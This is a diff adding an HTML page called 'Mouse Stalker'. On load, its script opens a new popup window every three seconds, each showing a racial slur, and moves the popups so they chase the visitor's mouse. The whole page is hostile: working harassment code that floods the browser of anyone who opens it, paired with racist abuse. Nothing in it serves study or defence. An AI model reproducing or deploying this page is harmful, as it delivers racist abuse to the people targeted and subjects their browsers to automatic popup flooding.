@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Mouse Stalker</title>
+</head>
+<body>
+  <h1>Mouse Tracker Activated</h1>
+
+  <script>
+    function startStalking() {
+      setInterval(() => {
+        const win = window.open('', '', 'width=150,height=150');
+        if (!win) return;
+        win.document.write('<body style="background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;"><h3>NIGGER</h3></body>');
+
+        let x = 0, y = 0;
+        document.addEventListener('mousemove', (e) => {
+          x = e.screenX;
+          y = e.screenY;
+        });
+
+        const mover = setInterval(() => {
+          if (win.closed) return clearInterval(mover);
+          try {
+            win.moveTo(x + Math.random() * 30 - 15, y + Math.random() * 30 - 15);
+          } catch (e) {}
+        }, 50);
+      }, 3000);
+    }
+
+    // Start automatically when page loads
+    startStalking();
+  </script>
+</body>
+</html>
